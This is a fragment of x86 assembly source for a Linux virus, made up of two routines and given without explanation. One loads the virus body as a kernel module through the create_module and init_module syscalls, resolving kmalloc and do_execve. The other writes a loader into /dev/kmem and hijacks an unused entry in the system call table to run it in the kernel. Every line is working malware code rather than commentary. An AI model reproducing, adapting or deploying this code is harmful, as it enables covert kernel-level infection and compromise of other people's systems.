;------------------------------------------------------------------------------
; Load kernel module
;
load_module:	pusha

		call	get_addr
		mov	ebp, eax
		
		mov	edx, MODULE_SIZE
		sub	esp, edx
		
		cld		
		mov	edi, esp
		mov	ecx, edx
		xor	eax, eax
		rep	stosb				; zeroing image

;;		push	edx		
;;		rdtsc
;;		pop	edx		
;;		and	eax, 0x0f0f0f0f
;;		add	eax, 0x61616161
;;		mov	[esp + HEADER_SIZE + VIRUS_SIZE], eax

		mov	esi, ebp
		lea	edi, [esp + HEADER_SIZE]
		mov	ecx, VIRUS_SIZE
		rep	movsb				; copy virus to image
		
		movb	eax, 127
;;		lea	ebx, [esp + HEADER_SIZE + VIRUS_SIZE]
lea ebx, [esp + HEADER_SIZE + O(name)]
		mov	ecx, edx
		int	0x80				; create_module
		cmp	eax, 0xfffff000
		ja	.failed
		
		; fill the module structure
		mov	ecx, esp
		push	byte HEADER_SIZE
		pop	ebx
		mov	dword [ecx + mod_szst], ebx
		mov	dword [ecx + mod_size],	edx
		lea	ebx,  [eax + HEADER_SIZE + O(module.init)]
		mov	dword [ecx + mod_init], ebx
		lea	ebx,  [eax + HEADER_SIZE + O(module.cleanup)]
		mov	dword [ecx + mod_fini], ebx
;;		lea	ebx,  [eax + HEADER_SIZE + VIRUS_SIZE]
lea ebx, [esp + HEADER_SIZE + O(name)]
		mov	dword [ecx + mod_name],	ebx

		; find the kmalloc address
		lea	eax, [ebp + O(name.kmalloc)]
		push	eax
		call	get_symbol
		or	eax, eax
		jz	.failed
		mov	[ecx + HEADER_SIZE + O(module.kmalloc)], eax
		
		; find the do_execve address
		lea	eax, [ebp + O(name.do_execve)]
		push	eax		
		call	get_symbol
		or	eax, eax
		jz	.failed
		mov	[ecx + HEADER_SIZE + O(module.do_execve)], eax		

		xor	eax, eax
		mov	al, 128
;;		lea	ebx, [esp + HEADER_SIZE + VIRUS_SIZE]
lea ebx, [esp + HEADER_SIZE + O(name)]
		int	0x80				; init_module
		or	eax, eax
		jnz	.failed

		xor	eax, eax
		mov	al, 129
		int	0x80				; delete_module

		xor	eax, eax
.return:	add	esp, edx
		mov	[esp + 0x1c], eax
		popa
		ret
.failed:	xor	eax, eax
		dec	eax
		jmp	short .return
;------------------------------------------------------------------------------
%define		SYS_NR	35				; unused syscall
;
; Patch /dev/kmem
patch_kmem:	pusha
		call	get_addr
		mov	ebp, eax

		lea	ebx, [ebp + O(name.dev_kmem)]
		movb	eax, 5
		movb	ecx, 2
		int	0x80				; open
		or	eax, eax
		jns	.open_ok
		jmp	.return

.open_ok:	xchg	eax, ebx
		
		movb	eax, 19
		mov	ecx, KMEM_ADDR
		movb	edx, 0
		int	0x80				; lseek
		cmp	ecx, eax
		jne	.failed		

		; find the kmalloc address
		lea	eax, [ebp + O(name.kmalloc)]
		push	eax
		call	get_symbol_sm
		or	eax, eax
		jz	.failed
		mov	[ebp + O(module.kmalloc)], eax
		
		; find the do_execve address
		lea	eax, [ebp + O(name.do_execve)]
		push	eax
		call	get_symbol_sm
		or	eax, eax
		jz	.failed
		mov	[ebp + O(module.do_execve)], eax		

		movb	eax, 4
		lea	ecx, [ebp + O(kmem_patch)]
		mov	edx, PKMEM_SIZE
		int	0x80				; write loader
		cmp	eax, edx
		jne	.failed

		; find the sys_call_table address
		lea	eax, [ebp + O(name.sys_call_table)]
		push	eax
		call	get_symbol_sm
		or	eax, eax
		jz	.failed
		
		lea	ecx, [eax + (SYS_NR * 4)]
		movb	eax, 19
		movb	edx, 0
		int	0x80				; lseek
		cmp	ecx, eax
		jne	.failed

		push	dword KMEM_ADDR
		mov	ecx, esp
		movb	eax, 4
		mov	edx, eax
		int	0x80				; write
		pop	eax
		
		movb	eax, SYS_NR
		mov	ebx, ebp			; vir addr in userspace
		mov	cx, 0xdead			; magic
		int	0x80				; invoke loader

.failed:	movb	eax, 6
		int	0x80

.return:	popa
		ret
;------------------------------------------------------------------------------